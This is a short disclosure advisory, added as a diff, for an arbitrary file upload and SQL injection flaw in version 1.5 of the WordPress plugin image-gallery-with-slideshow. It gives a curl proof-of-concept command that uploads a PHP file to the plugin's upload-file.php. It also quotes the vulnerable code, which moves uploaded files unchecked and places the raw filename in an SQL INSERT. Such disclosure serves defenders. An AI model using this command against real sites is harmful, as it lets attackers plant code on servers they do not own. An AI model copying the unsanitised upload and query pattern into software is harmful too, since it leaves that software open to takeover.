@@ -1,0 +1,21 @@
+Title: Wordpress image-gallery-with-slideshow plugin <= 1.5 Arbitrary file
+upload / SQL injection
+Version:1.5
+Date: 30-8-2011
+Author: Hrvoje Spoljar [ hrvoje.spoljar(at)gmail.com ]
+Software link:
+http://wordpress.org/extend/plugins/image-gallery-with-slideshow/
+
+PoC:
+curl -F "uploadfile=@mycode.php"
+http://domain.tld/wp-content/plugins/image-gallery-with-slideshow/upload-file.php
+
+File(s):upload-file.php
+Code:
+$new_image =time()."_".$_FILES['uploadfile']['name'];
+$original_image = $_FILES['uploadfile']['name'];
+...
+$value_org = move_uploaded_file($_FILES['uploadfile']['tmp_name'],
+$file_original);
+$insert_query = "INSERT INTO `".$table_prefix."combo_image`
+VALUES('','0','".$new_image."','".$original_image."','','','',NOW())";
